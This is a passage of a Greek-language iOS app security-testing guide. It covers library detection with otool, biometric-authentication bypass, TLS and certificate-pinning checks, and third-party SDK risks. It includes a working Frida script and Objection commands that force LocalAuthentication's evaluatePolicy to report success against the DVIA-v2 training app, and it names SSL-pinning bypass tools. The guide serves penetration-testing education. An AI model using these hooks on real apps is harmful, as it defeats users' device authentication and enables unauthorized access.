Η χρήση πλαισίων σε μια εφαρμογή μπορεί επίσης να ανιχνευθεί αναλύοντας τη λίστα των κοινών δυναμικών βιβλιοθηκών του δυαδικού αρχείου της εφαρμογής. Αυτό μπορεί να γίνει χρησιμοποιώντας το `otool`:
```bash
$ otool -L <AppName>.app/<AppName>
```
Αν χρησιμοποιείται το `LocalAuthentication.framework` σε μια εφαρμογή, η έξοδος θα περιέχει και τις δύο παρακάτω γραμμές (θυμηθείτε ότι το `LocalAuthentication.framework` χρησιμοποιεί το `Security.framework` από κάτω):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
Αν χρησιμοποιείται το `Security.framework`, μόνο το δεύτερο θα εμφανιστεί.

### Παράκαμψη Πλαισίου Τοπικής Αυθεντικοποίησης

#### **Objection**

Μέσω της **Objection Biometrics Bypass**, που βρίσκεται [σε αυτή τη σελίδα του GitHub](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass), διατίθεται μια τεχνική για την υπέρβαση του μηχανισμού **LocalAuthentication**. Ο πυρήνας αυτής της προσέγγισης περιλαμβάνει την εκμετάλλευση του **Frida** για την παραποίηση της συνάρτησης `evaluatePolicy`, διασφαλίζοντας ότι αποδίδει πάντα ένα αποτέλεσμα `True`, ανεξαρτήτως της πραγματικής επιτυχίας αυθεντικοποίησης. Αυτό είναι ιδιαίτερα χρήσιμο για την παράκαμψη ελαττωματικών διαδικασιών βιομετρικής αυθεντικοποίησης.

Για να ενεργοποιηθεί αυτή η παράκαμψη, χρησιμοποιείται η εξής εντολή:
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Αυτή η εντολή ενεργοποιεί μια ακολουθία όπου το Objection καταχωρεί μια εργασία που ουσιαστικά αλλάζει το αποτέλεσμα του ελέγχου **`evaluatePolicy`** σε `True`.

#### Frida

Ένα παράδειγμα χρήσης του **`evaluatePolicy`** από την [DVIA-v2 εφαρμογή](https://github.com/prateek147/DVIA-v2):
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
Για να επιτευχθεί η **παράκαμψη** της Τοπικής Αυθεντικοποίησης, έχει γραφτεί ένα σενάριο Frida. Αυτό το σενάριο στοχεύει τον έλεγχο **evaluatePolicy**, παρεμβαίνοντας στην ανατροφοδότησή του για να διασφαλίσει ότι επιστρέφει **success=1**. Με την τροποποίηση της συμπεριφοράς της ανατροφοδότησης, ο έλεγχος αυθεντικοποίησης παρακάμπτεται αποτελεσματικά.

Το παρακάτω σενάριο εισάγεται για να τροποποιήσει το αποτέλεσμα της μεθόδου **evaluatePolicy**. Αλλάζει το αποτέλεσμα της ανατροφοδότησης ώστε να υποδεικνύει πάντα επιτυχία.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```
Για να εισαχθεί το σενάριο Frida και να παρακαμφθεί η βιομετρική αυθεντικοποίηση, χρησιμοποιείται η ακόλουθη εντολή:
```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## Ευαίσθητη Έκθεση Λειτουργικότητας Μέσω IPC

### Προσαρμοσμένοι URI Διαχειριστές / Deeplinks / Προσαρμοσμένα Σχήματα

{{#ref}}
ios-custom-uri-handlers-deeplinks-custom-schemes.md
{{#endref}}

### Καθολικοί Σύνδεσμοι

{{#ref}}
ios-universal-links.md
{{#endref}}

### Κοινοποίηση UIActivity

{{#ref}}
ios-uiactivity-sharing.md
{{#endref}}

### UIPasteboard

{{#ref}}
ios-uipasteboard.md
{{#endref}}

### Επεκτάσεις Εφαρμογών

{{#ref}}
ios-app-extensions.md
{{#endref}}

### WebViews

{{#ref}}
ios-webviews.md
{{#endref}}

### Σειριοποίηση και Κωδικοποίηση

{{#ref}}
ios-serialisation-and-encoding.md
{{#endref}}

## Επικοινωνία Δικτύου

Είναι σημαντικό να ελέγξετε ότι δεν υπάρχει επικοινωνία **χωρίς κρυπτογράφηση** και επίσης ότι η εφαρμογή **επικυρώνει σωστά το πιστοποιητικό TLS** του διακομιστή.\
Για να ελέγξετε αυτά τα ζητήματα μπορείτε να χρησιμοποιήσετε έναν proxy όπως το **Burp**:

{{#ref}}
burp-configuration-for-ios.md
{{#endref}}

### Έλεγχος Ονόματος Κεντρικού Υπολογιστή

Ένα κοινό ζήτημα στην επικύρωση του πιστοποιητικού TLS είναι να ελέγξετε ότι το πιστοποιητικό έχει υπογραφεί από μια **έμπιστη** **CA**, αλλά **όχι να ελέγξετε** αν **το όνομα του κεντρικού υπολογιστή** του πιστοποιητικού είναι το όνομα του κεντρικού υπολογιστή που προσπελάζεται.\
Για να ελέγξετε αυτό το ζήτημα χρησιμοποιώντας το Burp, αφού εμπιστευτείτε την CA του Burp στο iPhone, μπορείτε να **δημιουργήσετε ένα νέο πιστοποιητικό με το Burp για έναν διαφορετικό κεντρικό υπολογιστή** και να το χρησιμοποιήσετε. Αν η εφαρμογή εξακολουθεί να λειτουργεί, τότε κάτι είναι ευάλωτο.

### Pinning Πιστοποιητικού

Αν μια εφαρμογή χρησιμοποιεί σωστά το SSL Pinning, τότε η εφαρμογή θα λειτουργεί μόνο αν το πιστοποιητικό είναι αυτό που αναμένεται. Όταν δοκιμάζετε μια εφαρμογή **αυτό μπορεί να είναι πρόβλημα καθώς το Burp θα σερβίρει το δικό του πιστοποιητικό.**\
Για να παρακάμψετε αυτή την προστασία σε μια jailbroken συσκευή, μπορείτε να εγκαταστήσετε την εφαρμογή [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) ή να εγκαταστήσετε [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device)

Μπορείτε επίσης να χρησιμοποιήσετε το **objection's** `ios sslpinning disable`

## Διάφορα

- Στο **`/System/Library`** μπορείτε να βρείτε τα frameworks που είναι εγκατεστημένα στο τηλέφωνο και χρησιμοποιούνται από τις συστημικές εφαρμογές
- Οι εφαρμογές που εγκαθίστανται από τον χρήστη από το App Store βρίσκονται μέσα στο **`/User/Applications`**
- Και το **`/User/Library`** περιέχει δεδομένα που αποθηκεύονται από τις εφαρμογές επιπέδου χρήστη
- Μπορείτε να αποκτήσετε πρόσβαση στο **`/User/Library/Notes/notes.sqlite`** για να διαβάσετε τις σημειώσεις που αποθηκεύονται μέσα στην εφαρμογή.
- Μέσα στον φάκελο μιας εγκατεστημένης εφαρμογής (**`/User/Applications/<APP ID>/`**) μπορείτε να βρείτε μερικά ενδιαφέροντα αρχεία:
- **`iTunesArtwork`**: Το εικονίδιο που χρησιμοποιείται από την εφαρμογή
- **`iTunesMetadata.plist`**: Πληροφορίες της εφαρμογής που χρησιμοποιούνται στο App Store
- **`/Library/*`**: Περιέχει τις προτιμήσεις και την προσωρινή μνήμη. Στο **`/Library/Cache/Snapshots/*`** μπορείτε να βρείτε το snapshot που πραγματοποιήθηκε στην εφαρμογή πριν την αποστολή της στο παρασκήνιο.

### Hot Patching/Επιβεβλημένη Ενημέρωση

Οι προγραμματιστές μπορούν απομακρυσμένα να **διορθώσουν όλες τις εγκαταστάσεις της εφαρμογής τους άμεσα** χωρίς να χρειάζεται να υποβάλουν ξανά την εφαρμογή στο App Store και να περιμένουν μέχρι να εγκριθεί.\
Για αυτό το σκοπό συνήθως χρησιμοποιείται το [**JSPatch**](https://github.com/bang590/JSPatch)**.** Αλλά υπάρχουν και άλλες επιλογές όπως το [Siren](https://github.com/ArtSabintsev/Siren) και το [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker).\
**Αυτός είναι ένας επικίνδυνος μηχανισμός που θα μπορούσε να καταχραστεί από κακόβουλα SDK τρίτων, επομένως συνιστάται να ελέγξετε ποια μέθοδος χρησιμοποιείται για την αυτόματη ενημέρωση (αν υπάρχει) και να την δοκιμάσετε.** Μπορείτε να προσπαθήσετε να κατεβάσετε μια προηγούμενη έκδοση της εφαρμογής για αυτό το σκοπό.

### Τρίτοι

Μια σημαντική πρόκληση με τα **SDK τρίτων** είναι η **έλλειψη λεπτομερούς ελέγχου** πάνω στις λειτουργίες τους. Οι προγραμματιστές αντιμετωπίζουν μια επιλογή: είτε να ενσωματώσουν το SDK και να αποδεχτούν όλα τα χαρακτηριστικά του, συμπεριλαμβανομένων πιθανών ευπαθειών ασφαλείας και ανησυχιών για την ιδιωτικότητα, είτε να παραιτηθούν εντελώς από τα οφέλη του. Συχνά, οι προγραμματιστές δεν είναι σε θέση να διορθώσουν τις ευπάθειες μέσα σε αυτά τα SDK. Επιπλέον, καθώς τα SDK κερδίζουν εμπιστοσύνη στην κοινότητα, ορισμένα μπορεί να αρχίσουν να περιέχουν κακόβουλο λογισμικό.

Οι υπηρεσίες που παρέχονται από τα SDK τρίτων μπορεί να περιλαμβάνουν παρακολούθηση συμπεριφοράς χρηστών, προβολές διαφημίσεων ή βελτιώσεις εμπειρίας χρήστη. Ωστόσο, αυτό εισάγει έναν κίνδυνο καθώς οι προγραμματιστές μπορεί να μην είναι πλήρως ενήμεροι για τον κώδικα που εκτελείται από αυτές τις βιβλιοθήκες, οδηγώντας σε πιθανούς κινδύνους για την ιδιωτικότητα και την ασφάλεια. Είναι κρίσιμο να περιορίσετε τις πληροφορίες που μοιράζεστε με υπηρεσίες τρίτων σε ό,τι είναι απαραίτητο και να διασφαλίσετε ότι δεν εκτίθεται ευαίσθητη δεδομένα.

Η υλοποίηση υπηρεσιών τρίτων συνήθως έρχεται σε δύο μορφές: μια αυτόνομη βιβλιοθήκη ή ένα πλήρες SDK. Για να προστατεύσετε την ιδιωτικότητα των χρηστών, οποιαδήποτε δεδομένα μοιράζεστε με αυτές τις υπηρεσίες θα πρέπει να είναι **ανώνυμα** για να αποτραπεί η αποκάλυψη Προσωπικών Αναγνωρίσιμων Πληροφοριών (PII).

Για να προσδιορίσετε τις βιβλιοθήκες που χρησιμοποιεί μια εφαρμογή, μπορεί να χρησιμοποιηθεί η εντολή **`otool`**. Αυτό το εργαλείο θα πρέπει να εκτελείται κατά της εφαρμογής και κάθε κοινής βιβλιοθήκης που χρησιμοποιεί για να ανακαλύψει πρόσθετες βιβλιοθήκες.
```bash
otool -L <application_path>
```
## **Αναφορές & Περισσότεροι Πόροι**

- [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
- [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
- [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
- [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
- [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
- [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
- [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
- [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
- [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
- [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
- [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
- [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
- [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
- [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
- [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
- [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
- [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) IOS δωρεάν μάθημα([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
- [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
- [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
- [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
- [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
- [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
- OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Objective-C έκδοση [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Swift έκδοση
- [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
- [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)


{{#include ../../banners/hacktricks-training.md}}
